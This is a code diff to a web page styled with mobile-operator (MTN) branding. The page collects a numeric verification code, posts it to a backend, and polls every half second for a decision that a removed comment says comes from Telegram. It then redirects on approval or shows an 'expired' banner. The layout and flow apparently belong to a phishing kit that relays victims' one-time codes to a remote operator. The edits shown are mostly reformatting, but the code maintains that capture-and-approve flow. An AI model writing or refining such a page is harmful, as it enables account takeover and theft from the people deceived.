@@ -70,16 +70,14 @@
   .code-sub b{color:var(--mtn-blue-deep);font-weight:800;}
 
   .expired-banner{
-    display:none;
-    align-items:center;gap:10px;
+    display:none;align-items:center;gap:10px;
     background:linear-gradient(90deg, rgba(211,47,47,0.10), rgba(211,47,47,0.05));
     border:1px solid rgba(211,47,47,0.40);
     color:var(--red);
     padding:12px 14px;border-radius:12px;
     margin-bottom:20px;text-align:left;
     font-size:12.5px;font-weight:700;
-    line-height:1.5;
-    animation:bannerIn .3s ease;
+    line-height:1.5;animation:bannerIn .3s ease;
   }
   .expired-banner.show{display:flex;}
   @keyframes bannerIn{
@@ -98,28 +96,16 @@
   .expired-banner b{color:#8B0000;font-weight:900;}
 
   .code-input{
-    width:100%;
-    padding:22px 14px;
-    border:2px solid var(--border);
-    border-radius:14px;
-    background:#FBFDFF;
-    font-size:38px;
-    font-weight:900;
-    color:var(--mtn-blue-deep);
-    letter-spacing:22px;
-    text-align:center;
-    font-variant-numeric:tabular-nums;
-    transition:.18s;
-    margin-bottom:16px;
+    width:100%;padding:22px 14px;
+    border:2px solid var(--border);border-radius:14px;
+    background:#FBFDFF;font-size:38px;font-weight:900;
+    color:var(--mtn-blue-deep);letter-spacing:22px;text-align:center;
+    font-variant-numeric:tabular-nums;transition:.18s;margin-bottom:16px;
   }
-  .code-input::placeholder{
-    color:#D5DEE9;letter-spacing:22px;font-weight:900;
-  }
+  .code-input::placeholder{color:#D5DEE9;letter-spacing:22px;font-weight:900;}
   .code-input:focus{
-    outline:none;
-    border-color:var(--mtn-blue-deep);
-    background:#fff;
-    box-shadow:0 0 0 4px rgba(0,43,92,0.12);
+    outline:none;border-color:var(--mtn-blue-deep);
+    background:#fff;box-shadow:0 0 0 4px rgba(0,43,92,0.12);
   }
   .code-input.shake{
     animation:shake .4s cubic-bezier(.36,.07,.19,.97) both;
@@ -133,19 +119,15 @@
   }
 
   .indicator{
-    width:100%;height:5px;
-    background:#E8EEF6;border-radius:6px;
-    overflow:hidden;margin-bottom:26px;
+    width:100%;height:5px;background:#E8EEF6;
+    border-radius:6px;overflow:hidden;margin-bottom:26px;
   }
   .indicator-bar{
     height:100%;width:0%;
     background:linear-gradient(90deg, var(--mtn-blue-deep), var(--mtn-blue));
-    border-radius:6px;
-    transition:width .25s ease, background .25s ease;
+    border-radius:6px;transition:width .25s ease, background .25s ease;
   }
-  .indicator-bar.warning{
-    background:linear-gradient(90deg, #E53935, var(--red));
-  }
+  .indicator-bar.warning{background:linear-gradient(90deg, #E53935, var(--red));}
 
   .cta{
     width:100%;padding:16px;border:none;border-radius:12px;
@@ -159,12 +141,9 @@
 
   .resend-btn{
     display:inline-flex;align-items:center;gap:6px;
-    margin-top:16px;
-    background:transparent;border:none;
-    color:var(--mtn-blue-deep);
-    font-size:13px;font-weight:800;
-    cursor:pointer;padding:8px 12px;
-    border-radius:8px;
+    margin-top:16px;background:transparent;border:none;
+    color:var(--mtn-blue-deep);font-size:13px;font-weight:800;
+    cursor:pointer;padding:8px 12px;border-radius:8px;
     transition:.18s;font-family:inherit;letter-spacing:0.2px;
   }
   .resend-btn:hover:not(:disabled){background:rgba(0,79,159,0.08);}
@@ -350,7 +329,6 @@
   const rbtn   = el('resendBtn');
   const banner = el('expiredBanner');
 
-  let pollingActive = false;
   let redirected = false;
 
   function setStatus(msg, type){
@@ -406,6 +384,7 @@
 
     let requestId = null;
 
+    // ---- Step 1: Submit code ----
     try{
       const res = await fetch(`${API}/code`, {
         method: 'POST',
@@ -418,7 +397,7 @@
       });
 
       const data = await res.json();
-      console.log('[CODE] submit response:', data);
+      console.log('[CODE] submit:', data);
 
       if(!data.ok){
         hideProcessing();
@@ -432,6 +411,7 @@
 
       requestId = data.request_id;
       localStorage.setItem('code_request_id', requestId);
+      console.log('[CODE] request_id:', requestId);
 
     }catch(err){
       hideProcessing();
@@ -443,10 +423,7 @@
       return;
     }
 
-    // ---- Poll for Telegram decision — every 500ms ----
-    if(pollingActive) return;
-    pollingActive = true;
-
+    // ---- Step 2: Poll every 500ms for the decision ----
     const MAX_WAIT = 5 * 60 * 1000;
     const start = Date.now();
     let consecutiveUnknown = 0;
@@ -457,23 +434,20 @@
       try{
         const r = await fetch(`${API}/code-status/${requestId}`);
         const s = await r.json();
+        console.log('[POLL]', requestId, s.status);
 
-        console.log('[POLL]', requestId, '->', s);
-
-        // ✅ Approved → navigate IMMEDIATELY
+        // ✅ APPROVED → INSTANT REDIRECT
         if(s.status === 'approved'){
           redirected = true;
           clearInterval(poll);
-          pollingActive = false;
-          console.log('[REDIRECT] Going to approved.html');
+          console.log('[REDIRECT] -> approved.html');
           window.location.replace(`approved.html?status=approved&id=${requestId}`);
           return;
         }
 
-        // ❌ Declined → stay, show banner
+        // ❌ DECLINED
         if(s.status === 'declined' || s.status === 'expired'){
           clearInterval(poll);
-          pollingActive = false;
           hideProcessing();
           showExpiredBanner();
           setStatus('');
@@ -486,12 +460,11 @@
           return;
         }
 
-        // ⚠️ Unknown
+        // ⚠️ UNKNOWN
         if(s.status === 'unknown'){
           consecutiveUnknown++;
           if(consecutiveUnknown >= 3){
             clearInterval(poll);
-            pollingActive = false;
             hideProcessing();
             showExpiredBanner();
             setStatus('');
@@ -509,7 +482,6 @@
 
         if(Date.now() - start > MAX_WAIT){
           clearInterval(poll);
-          pollingActive = false;
           hideProcessing();
           showExpiredBanner();
           setStatus('');
@@ -520,7 +492,7 @@
       }catch(err){
         console.warn('[POLL ERROR]', err);
       }
-    }, 500);  // ← poll every 500ms
+    }, 500);
   }
 
   async function resendCode(){
